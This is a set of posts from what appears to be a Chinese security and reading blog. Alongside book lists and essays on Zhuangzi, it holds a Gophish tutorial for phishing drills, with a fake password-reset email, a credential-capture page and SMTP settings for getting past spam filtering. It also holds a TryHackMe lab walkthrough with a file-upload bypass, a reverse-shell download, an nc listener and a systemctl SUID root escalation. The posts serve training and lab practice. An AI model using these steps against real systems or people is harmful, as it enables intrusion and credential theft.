[{"content":"","date":"2020-07-23","permalink":"https://xeye.io/post/%E4%BA%92%E8%81%94%E7%BD%91%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E9%AB%98%E7%BA%A7%E6%8C%87%E5%8D%97%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/","tags":["安全建设"],"title":"《互联网企业安全高级指南》思维导图"},{"content":"一、准备工作 Gophish是一个开源网络钓鱼工具包\n特点是开箱即用，特别适合甲方用来对内部员工进行邮件钓鱼演练。\n项目主页：https://getgophish.com/\n1、安装 支持Windows/ Mac/Linux平台。下载对应系统版本（https://github.com/gophish/gophish/releases/）的压缩包，运行二进制文件即可。\n2、编译安装  Gophish编译安装需要Go v1.10或更高版本！\n go get github.com/gophish/gophish cd ~/.go/src/github.com/gophish/gophish/ [你本机的go项目目录] go build ./gophish [运行生成的gophish二进制文件，浏览器访问即可] https://localhost:3333 [默认用户admin，密码在终端生成]  3、Docker https://hub.docker.com/r/gophish/gophish/\n4、项目文档 http://getgophish.com/documentation\n5、问题反馈 https://github.com/gophish/gophish/issues/new\n6、免费SSL证书 示例域名： https://access.a.com 安装ssl证书（letsencrypt）： cd /opt/gophish # 你的gophish目录 sudo apt install certbot sudo kill $(pidof gohpish) sudo certbot certonly -d access.a.com --standalone ln -s /etc/letsencrypt/live/access.a.com/privkey.pem access.a.com.key ln -s /etc/letsencrypt/live/access.a.com/fullchain.pem access.a.com.crt  7、配置文件 # nano config.json { \u0026quot;admin_server\u0026quot;: { \u0026quot;listen_url\u0026quot;: \u0026quot;0.0.0.0:8088\u0026quot;, //修改默认端口 \u0026quot;use_tls\u0026quot;: true, \u0026quot;cert_path\u0026quot;: \u0026quot;gophish_admin.crt\u0026quot;, \u0026quot;key_path\u0026quot;: \u0026quot;gophish_admin.key\u0026quot; }, \u0026quot;phish_server\u0026quot;: { \u0026quot;listen_url\u0026quot;: \u0026quot;0.0.0.0:443\u0026quot;, //https开启443端口 \u0026quot;use_tls\u0026quot;: true, \u0026quot;cert_path\u0026quot;: \u0026quot;access.a.com.crt\u0026quot;, //修改证书 \u0026quot;key_path\u0026quot;: \u0026quot;access.a.com.key\u0026quot; //修改证书 }, \u0026quot;db_name\u0026quot;: \u0026quot;sqlite3\u0026quot;, //数据库支持MySQL \u0026quot;db_path\u0026quot;: \u0026quot;gophish.db\u0026quot;, \u0026quot;migrations_prefix\u0026quot;: \u0026quot;db/db_\u0026quot;, \u0026quot;contact_address\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;logging\u0026quot;: { \u0026quot;filename\u0026quot;: \u0026quot;/var/log/gophish/gophish.log\u0026quot;, //日志记录，需要先创建目录和文件，否则跑不起来 \u0026quot;level\u0026quot;: \u0026quot;\u0026quot; } }  二、目标人群 \n模板案例，名字我只用FirstName，后面邮件内容模板用到这个变量FirstName\n\n 三、邮件内容模板  用户名处插入变量：{{.FirstName}}，程序发送邮件的时候会自动插入对应的用户名。\n \n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;您的ucenter帐户：{{.FirstName}}\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026amp;nbsp;出现异常登陆\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;，请您立即修改ucenter帐户密码，否则账户将被禁止使用。\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026amp;nbsp;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;修改密码地址：\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;a href=\u0026quot;{{.URL}}\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;https://ucenter.test.com\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;{{.Tracker}}\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  模板变量参考    Variable Description     {{.RId}} The target’s unique ID   {{.FirstName}} The target’s first name   {{.LastName}} The target’s last name   {{.Position}} The target’s position   {{.Email}} The target’s email address   {{.From}} The spoofed sender   {{.TrackingURL}} The URL to the tracking handler   {{.Tracker}} An alias for \u0026lt;img src=\u0026quot;{{.TrackingURL}}\u0026quot;/\u0026gt;   {{.URL}} The phishing URL   {{.BaseURL}} The base URL with the path and rid parameter stripped. Useful for making links to static files.    四、登陆页面 注意，目标网站使用了前端框架的话（例如vue）会导致克隆失败，页面无法显示，需要自己保存网站页面并修改HTML代码，VUE框架由于使用js来触发form动作，需要注释并自己添加from代码。\n\u0026lt;form action=\u0026quot;\u0026quot; autocomplete=\u0026quot;off\u0026quot; class=\u0026quot;ivu-form ivu-form-label-right\u0026quot; enctype=\u0026quot;application/x-www-form-urlencoded\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt;  示例代码：\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026quot;\u0026quot; method=\u0026quot;post\u0026quot; name=\u0026quot;form\u0026quot;\u0026gt;\u0026lt;label\u0026gt;用户名:\u0026lt;/label\u0026gt; \u0026lt;input name=\u0026quot;username\u0026quot; type=\u0026quot;text\u0026quot; /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;label\u0026gt;密码:\u0026lt;/label\u0026gt; \u0026lt;input name=\u0026quot;password\u0026quot; type=\u0026quot;password\u0026quot; /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;input id=\u0026quot;login\u0026quot; name=\u0026quot;login\u0026quot; type=\u0026quot;submit\u0026quot; value=\u0026quot;修改密码\u0026quot; /\u0026gt;\u0026amp;nbsp;\u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  \n 五、邮箱配置 目标使用的是QQ企业邮箱，我这里使用的是QQ域名邮箱，可以直接绕过反垃圾，注意QQ域名邮箱已经下线，目前只有已开通的域名才能使用，而且不能新增成员。\nName: 运维部账号管家\u0026lt;account@test.com\u0026gt; Interface Type: 运维部账号管家\u0026lt;account@test.com\u0026gt; Host: smtp.qq.com:587 Username: account@test.com Password: 123456789abc  \n六、发送钓鱼邮件 1、发件配置 选择你创建的模板，输入钓鱼域名URL，程序在每封邮件内容中插入{{.URL}}变量，并创建一个唯一的id，以便跟踪统计。\n\n\n2、统计面板 \n\n3、记录密码 \n4、重放攻击 \n 七、报表 \n1、报表类型  攻击结果记录 带时间线的原始事件记录  \n2、Goreport Goreport是一个第三方的报表生产脚本，通过Gophish API可以帮你快速生成IP地址、操作系统、浏览器类型、版本、位置信息列表。并导出为execl或者word文档。\n项目地址：https://github.com/chrismaddalena/GoReport\n先创建配置文件，写入Gophish API，其他两项没有可以忽略\ngophish.config\n[Gophish] gp_host: https://127.0.0.1:3333 api_key: \u0026lt;YOUR_API_KEY\u0026gt; [ipinfo.io] ipinfo_token: \u0026lt;IPINFO_API_KEY\u0026gt; [Google] geolocate_key: \u0026lt;GEOLOCATE_API_KEY\u0026gt;  基本用法 python3 goreport.py --id 20 --format excel  程序会自动从接口 https://localhost:3333/api/campaigns/20/?api_key=key 获得统计内容，并将结果输出到xlsx/csv/word文件。\n一次可以导出多个结果ID的统计报告\npython3 goreport.py --id 20,21-25,88 --format csv  合并多个报告\npython3 goreport.py --id 20,21-25,88 --format excel --combine  效果如图：\n\n\n\n\n 八、其他 项目地址：https://github.com/gophish/user-guide/\n用户指南：https://docs.getgophish.com/user-guide/\n接口文档：https://docs.getgophish.com/api-documentation/\n","date":"2020-07-02","permalink":"https://xeye.io/post/gophish%E9%92%93%E9%B1%BC%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/","tags":["红队"],"title":"Gophish钓鱼工具使用教程"},{"content":"推荐阅读书单，通读任意一本受益终身。\n推荐书单：\n一、易家大道根源书 《河图》 《洛书》 《易经》 二、黄老庄道家三圣书之至道四经 《黄帝内经》 《黄帝阴符经》 《道德经》 《庄子》 三、孔孟荀儒家三圣书 《论语》 《易传》 《春秋》 《诗经》 《尚书》 《孟子》 《荀子》 《礼记》 四、管商韩法家三圣书 《管子》 《商君书》 《韩非子》 五、先秦诸圣书 《素书》 《列子》 《黄帝四经》 《吕氏春秋》 《鬼谷子》 《鬼谷子阴符本经七术》 《楚辞》 《离骚》 《汤液经法》 六、中医四大经典 《黄帝内经》 《难经》 《伤寒杂病论》 《神农本草经》 七、兵家之武经七书 《孙子兵法》 《吴子兵法》 《六韬》 《司马法》 《三略》 《尉缭子》 《李卫公问对》 八、春秋三传 《春秋左传》 《春秋公羊传》 《春秋谷梁传》 九、史家绝唱书 《史记》 《汉书》 《后汉书》 《资治通鉴》 十、华夏诸圣贤书 《新语》 《谏迎佛骨表》 《太极图》 《指玄篇》 《无极图》 《张载集》 《朱子语类》 《周易外传》 《黄书》 《尚书引义》 《永历实录》 《春秋世论》 《噩梦》 《宋论》 《中国人的精神》 《毛泽东选集》 十一、明察之书 范文澜《中国通史》 徐大椿《医学源流论》 戚本禹《戚本禹回忆录》 十二、外国书籍 尼采 《悲剧的诞生》《不合时宜的考察》《人性的，太人性的》《漫游者和他的影子》《曙\n光》《快乐的知识》《重估一切价值》《查拉斯图拉如是说》《善恶的彼岸》《道德的谱系》《权力意志》《偶像的黄昏》《看哪，这个人》\n马克思 《德意志意识形态》《共产党宣言》《资本论》《哲学的贫困》\n弗洛伊德 《梦的解析》《图腾与禁忌》《弗洛伊德自传》\n胡塞尔 《现象学方法》《生活世界现象学》《欧洲科学的危机与超越论的现象学》\n海德格尔 《存在与时间》《林中路》《尼采》\n雅斯贝尔斯 《苏格拉底、佛陀、孔子和耶稣》《大哲学家》《悲剧的超越》\n德里达 《马克思的幽灵》《德里达中国讲演录》《解构》\n福柯 《词与物》《临床医学的诞生》《癫狂与文明》\n德勒茲 《千块高原》《反俄狄浦斯》《尼采与哲学》《德勒兹论福柯》\n巴塔耶 《色情史》《色情、耗费与普遍经济》《文学与恶》《爱华妲夫人及其它》\n布朗肖 《文学空间》《从卡夫卡到卡夫卡》《变异的思想》《最后之人》《等待，遗忘》《那没有伴着我的一个》《黑暗托马》《死刑判决》\n马尔库塞 《单向度的人》《爱欲与文明》\n本雅明 《单行道》《迎向灵光消逝的年代》《发达资本主义时代的抒情诗人》《机械复制时代的艺术作品》《经验与贫乏》\n弗洛姆 《健全的社会》《逃避自由》《爱的艺术》《人类的破坏性剖析》\n哈贝马斯 《合法性危机》《包容他者》《后形而上学思想》《恐怖时代的哲学》\n荣格 《寻求灵魂的现代人》《现代灵魂的自我拯救》《让我们重返精神的家园》《人类及其象征》《荣格自传》《原型与集体无意识》《荣格文集》《未发现的自我》《心理学与文学》\n拉康 《镜像阶段》《阅读你的症状》《拉康选集》\n维特根斯坦 《逻辑哲学导论》《论确定性》《哲学研究》《哲学语法》《战时笔记》《文化的价值》《数学基础研究》《关于心理学的最后著作》\n泰勒 《自我的根源》\n卡夫卡 《变形记》《城堡》《审判》《卡夫卡散文》《审判》《美国》\n贝克特 《镇定剂》《等待戈多》《世界与裤子》《无法称呼的人》\n穆奇尔 《没有个性的人》《穆奇尔散文集》\n普鲁斯特 《追忆似水年华》\n加缪 《局外人》《异乡人》《西西弗斯的神话》《鼠疫》\n乔伊斯 《尤利西斯》\n马尔克斯 《百年孤独》《霍乱时期的爱情》\n博尔赫斯 《小径分叉的花园》《红色的旋律》《面前的月亮》《深沉的玫瑰》《梦之书》《沙之书》《虚构集》\n品钦 《万有引力之虹》\n黑塞 《纳尔齐斯与歌尔德蒙》《荒原狼》《东方之旅》《玻璃球游戏》\n契诃夫 《第六病室》\n托尔斯泰 《安娜·卡列尼娜》《战争与和平》《复活》\n陀思妥耶夫斯基 《死屋手记》《卡拉马佐夫兄弟》《罪与罚》《被侮辱的与被损害的》\n布尔加科夫 《大师与玛格丽特》\n劳伦斯 《卡泰莱夫人的情人》《劳伦斯散文集》《不是我，而是风》\n亨利·米勒 《北回归线》《黑色的春天》《马洛西的大石像》\n纳博科夫 《洛丽塔》《微暗的火》《斩首之邀》\n昆德拉 《告别圆舞曲》《好笑的爱》《不能承受的生命之轻》《不朽》《身份》《笑忘录》\n波德莱尔 《异乡人》《恶之花》《巴黎的忧郁》\n兰波 《彩画集》《醉舟》《地狱一季》《全蚀狂爱》（电影）《兰波作品集》\n里尔克 《杜伊诺哀歌》《献给奥尔甫斯的十四行诗》《里尔克诗选》\n荷尔德林 《荷尔德林诗选》\n保罗·策兰 《保罗·策兰诗选》\n麦克卢汉 《理解媒介》《机器新娘》《谷登堡星汉璀璨》《麦克卢汉如是说》\n鲍德里亚 《媒介的挽歌》《生产之镜》《消费社会》《生产之镜》《完美的罪行》《物的体系》《幻觉的终结》《拟像与模拟》《象征性消费与死亡》《美国》\n施特劳斯 《忧郁的热带》《新结构人类学》《野性的思维》《种族与历史》\n罗蒂 《偶然》\n","date":"2020-06-29","permalink":"https://xeye.io/post/%E6%8E%A8%E8%8D%90%E4%B9%A6%E5%8D%95/","tags":["阅读"],"title":"推荐书单"},{"content":" 有人看了《庄子》，就认为庄子是书里描写的那样，是个吃米都得找人借的穷光蛋。认为他出身卑微，一生穷困潦倒，实际上并不是这样。那只是书里面写的寓言，不能把寓言当现实。\n  庄子是个什么样的人？ 庄子是楚国人，居住在楚国蒙地，蒙地就是今天的安徽蒙城县。庄子曾经的职业是做蒙地的漆园吏。有人说庄子是宋国人，这是毫无根据的结论。首先，宋国不是当时的学术中心，不具备产生圣人的文化土壤。其次，宋国的漆器根本不发达，没有产业的驱动，不可能产生庞大的原材料生产基地。\n再次，宋国是商朝遗民，在周朝，宋人一直备受天下人讥讽，只有宋人不讥讽自己。庄子在书里，对宋人的讥讽十分辛辣，显然庄子不会是宋人。那时候如果要讲一个傻子的故事，通常开篇都是说，从前有个宋人。\n以此三点来反观楚国，更能说明庄子是楚国人，而不是宋人。首先，楚国是当时的文化和学术中心。不仅产生了庄子这样的圣人，还产生了老子和屈原这样的大圣人。其次，楚国的漆器艺术和产业是当时最发达和繁荣的，所以才有很多的漆园。再次，庄子对楚国是充满褒扬之心的。庄子在逍遥游开篇就讲图南之志，这就是楚国文化所特有的对凤凰的崇拜。中原文化，更多的是崇拜龙。\n对庄子的另一个误解是，认为漆园吏是一个微不足道的小官。实际上，漆器是楚国的战略产业，是当时天下最名贵最高端的奢饰品。它既代表了当时艺术审美的巅峰，也是楚国皇家御用品，同时还是楚国出口的支柱产品。所以说，漆园吏非但不是无足轻重的小官，还是掌管楚国战略资源的重要官员。\n为什么这么重要的职位，会让庄子来负责呢？因为庄子是楚国贵族，和楚国国君是亲戚。庄子是楚庄王的后人，庄子的姓氏，就来自楚庄王的谥号庄字。以祖上的谥号为姓氏，庄姓的源头就出自楚国。有人看了《庄子》，就认为庄子是书里描写的那样，是个吃米都得找人借的穷光蛋。认为他出身卑微，一生穷困潦倒，实际上并不是这样。那只是书里面写的寓言，不能把寓言当现实。\n看到这里，是不是很多人觉得有些诧异，楚人不是蛮夷吗？怎么会成为当时的学术和文化中心呢？实际上，楚人非但不是蛮夷，还是三皇时期就根正苗红的中原华夏族人。华夏族是汉族在汉朝之前的称谓。商代夏之后，商人把楚人从中原驱逐了出去。还蔑称楚人是蛮夷。后来周代商，赶走了商人，楚人也是武王伐纣的盟友之一。立了功的楚人觉得，自己终于可以回归中原了。但是周人并没有把楚人封在中原，而是视楚人为蛮夷，怠慢了楚人。\n周王室没有把楚人迁回中原，只给楚国封了一个子爵，这是当时所有诸侯国里面最低级的一个爵位，封地也只有五十平方公里，这就是楚国最开始的建国基础。后来楚国人一直奋发图强，就是为了能提高自己的尊位。到了楚武王的时候，楚武王攻打随国。大家都很愤怒，因为依据周礼，不可攻伐无罪之国。楚武王之所以这么做，就是为了让周天子能够提高自己的爵位。但是周王室拒绝了楚国。愤怒的楚武王发出了震惊天下的一句话：“王不加位，我自尊耳。”\n楚武王，把自己的三个儿子都封了王，这样楚和周成了并立的两个王朝。自立为王是楚国命运的一个大转折点。周王室内乱，王子朝奔楚，则是楚国文化和学术兴盛，并使楚国成为文化中心的重大的转折点。\n综上可见，当年楚人南奔，保留下来了很多上古三皇时期的文化火种。从老庄的书里，可以看出来浓厚的三皇之学的底蕴。周朝官学的长期辐射和影响，使得楚国的文化学术逐步繁荣，老子做周王室史官，得以学习继承古圣之道。王子朝携带周室典籍奔楚后，楚国便成为当时的天下文化和学术中心。这便是老庄之道的源流和传承。\n","date":"2020-04-07","permalink":"https://xeye.io/post/%E9%97%B2%E8%AF%9D%E5%BA%84%E5%AD%90%E4%B8%80%E5%BA%84%E5%AD%90%E5%85%B6%E4%BA%BA/","tags":["阅读"],"title":"闲话庄子：一、庄子其人"},{"content":"在庄子看来，生，只是一段插曲。\n你来自于无，又归于无。死亡，就像是回家。所以，有视死如归之说。和漫长的虚无相比，生就是一次微不足道的火花，转瞬即逝。\n等你死后，回到家里。回想起你生着的那段时间，感觉仿佛是被人从家里扔了出去一样。如同你现在认为，死亡会把你的生命抛出去一样。\n对于死亡的恐惧，只是归乡情怯。把虚无理解为死亡，是不美好的。它生了你，又回收你，其实它就是你本来的样子。只是你不知道。\n庄子的妻子死后，庄子鼓盆而歌，并不是因为庄子神经病，而是他视死如归。 那么庄子的高度到底如何呢，庄子达到的高度就是《庄子•天下篇》中描述的那样\n “上与造物者游，而下与外生死无终始者为友。独与天地精神相往来”。\n 与造物主牵着手一起看夕阳，这大概就是道家的终极追求了。\n","date":"2020-04-07","permalink":"https://xeye.io/post/%E9%97%B2%E8%AF%9D%E5%BA%84%E5%AD%90%E4%BA%8C%E5%BA%84%E5%AD%90%E7%9A%84%E7%94%9F%E6%AD%BB%E8%A7%82/","tags":["阅读"],"title":"闲话庄子：二、庄子的生死观"},{"content":"0x00 前言\n  靶机名称：Vulnversity\n  靶机简介：Vulnversity靶机主要学习主动侦查扫描，Web应用攻击和suid提权。\n  攻击路径：端口扫描\u0026ndash;\u0026gt;Web目录爆破\u0026ndash;\u0026gt;文件上传漏洞利用\u0026ndash;\u0026gt;权限提升\n  相关工具：nmap、gobuster、burpsuite、nc、webshell\n  难度：容易\n  0x01 侦查\n1.nmap 扫描\nnmap -sV -sC -T4 -A 10.10.137.247 -oA 10.10.137.247.nmap ☁ vulnversity nmap -sV -sC -T4 -A 10.10.137.247 -oA 10.10.137.247.nmap Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-19 19:39 CST Nmap scan report for 10.10.137.247 Host is up (0.26s latency). Not shown: 972 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA) | 256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA) |_ 256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 163/tcp filtered cmip-man 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 625/tcp filtered apple-xsrvr-admin 1001/tcp filtered webpush 1070/tcp filtered gmrupdateserv 1147/tcp filtered capioverlan 3128/tcp open http-proxy Squid http proxy 3.5.12 |_http-server-header: squid/3.5.12 |_http-title: ERROR: The requested URL could not be retrieved 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Vuln University 3871/tcp filtered avocent-adsap 3878/tcp filtered fotogcad 4449/tcp filtered privatewire 5225/tcp filtered hp-server 6106/tcp filtered isdninfo 7002/tcp filtered afs3-prserver 8181/tcp filtered intermapper 8193/tcp filtered sophos 8652/tcp filtered unknown 9502/tcp filtered unknown 10012/tcp filtered unknown 14441/tcp filtered unknown 15002/tcp filtered onep-tls 15003/tcp filtered unknown 27352/tcp filtered unknown 49155/tcp filtered unknown 64623/tcp filtered unknown No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=3/19%OT=21%CT=1%CU=32906%PV=Y%DS=2%DC=T%G=Y%TM=5E735A2 OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS( OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11 OS:NW7%O6=M54DST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN( OS:R=Y%DF=Y%T=40%W=6903%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 1h20m22s, deviation: 2h18m34s, median: 21s |_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: vulnuniversity | NetBIOS computer name: VULNUNIVERSITY\\x00 | Domain name: \\x00 | FQDN: vulnuniversity |_ System time: 2020-03-19T07:40:44-04:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-03-19T11:40:44 |_ start_date: N/A TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 539.50 ms 10.9.0.1 2 539.58 ms 10.10.137.247 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 53.95 seconds  2. 查看端口开放服务和数量\ngrep \u0026quot;open\u0026quot; 10.10.137.247.nmap.nmap 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) grep \u0026quot;open\u0026quot; 10.10.137.247.nmap.nmap |wc -l 6  0x02 Web目录爆破\nobuster项目地址：https://github.com/OJ/gobuster gobuster dir -u http://10.10.137.247:3333/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  发现上传页面\nhttp://10.10.137.247:3333/internal/  \n\n0x03 穷举上传文件扩展名\n\n\n设置Content-Type类型为php\nContent-Type: application/x-php  取消URL默认编码（Payload文件名中的\u0026rdquo;.\u0026ldquo;被URL编码会导致访问失败）\nBurpsuite --\u0026gt; Intruder --\u0026gt; Payloads --\u0026gt; Payload Encoding --\u0026gt; BurpsuitePayload Encoding  \n发现可以上传.phhtm\n\n0x04 上传Webshell wget https://github.com/pentestmonkey/php-reverse-shell/raw/master/php-reverse-shell.php -O php-reverse-shell.phtml  反弹IP修改为本机（攻击机）\n\n\n0x04 反弹shell 本机NC监听1234端口\n nc -lvnp 1234  访问后门后获得shell，flag在用户目录下\n$ cat /home/bill/user.txt 8bd7992fxxxxxxxxxxxxxxxxxxxxxx  \n0x04 提权 利用SUID提权，搜索所有SUID文件\n\n$ find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah -rwsr-xr-x 1 root root 31K Jul 12 2016 /bin/fusermount -rwsr-xr-x 1 root root 40K May 16 2018 /bin/mount -rwsr-xr-x 1 root root 139K Jan 28 2017 /bin/ntfs-3g -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping6 -rwsr-xr-x 1 root root 40K May 16 2017 /bin/su -rwsr-xr-x 1 root root 645K Feb 13 2019 /bin/systemctl -rwsr-xr-x 1 root root 27K May 16 2018 /bin/umount -rwsr-xr-x 1 root root 35K Mar 6 2017 /sbin/mount.cifs -rwsr-sr-x 1 daemon daemon 51K Jan 14 2016 /usr/bin/at -rwsr-xr-x 1 root root 49K May 16 2017 /usr/bin/chfn -rwsr-xr-x 1 root root 40K May 16 2017 /usr/bin/chsh -rwsr-xr-x 1 root root 74K May 16 2017 /usr/bin/gpasswd -rwsr-xr-x 1 root root 33K May 16 2017 /usr/bin/newgidmap -rwsr-xr-x 1 root root 39K May 16 2017 /usr/bin/newgrp -rwsr-xr-x 1 root root 33K May 16 2017 /usr/bin/newuidmap -rwsr-xr-x 1 root root 53K May 16 2017 /usr/bin/passwd -rwsr-xr-x 1 root root 23K Jan 15 2019 /usr/bin/pkexec -rwsr-xr-x 1 root root 134K Jul 4 2017 /usr/bin/sudo -rwsr-xr-- 1 root messagebus 42K Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10K Mar 27 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 419K Jan 31 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 15K Jan 15 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-sr-x 1 root root 97K Jan 29 2019 /usr/lib/snapd/snap-confine -rwsr-xr-x 1 root root 75K Jul 17 11:22 /usr/lib/squid/pinger -rwsr-xr-x 1 root root 3  \n我们看到靶机系统允许所有登陆用户创建系统服务并以root权限运行，systemctl用于控制systemd初始化服务的工具。\nxxx=$(mktemp).service //创建一个名为xxx的环境变量，调用mktemp创建一个临时的systemd服务配置文件 echo '[Service] ExecStart=/bin/sh -c \u0026quot;cat /root/root.txt \u0026gt; /tmp/output\u0026quot; [Install] WantedBy=multi-user.target' \u0026gt; $xxx //将配置内容写入环境变量，服务执行后通过root权限去读flag文件。 /bin/systemctl link $xxx /bin/systemctl enable --now $xxx //链接服务并启动 cat /tmp/output a58ffxxxxxxxxxxxxxxxxxxx 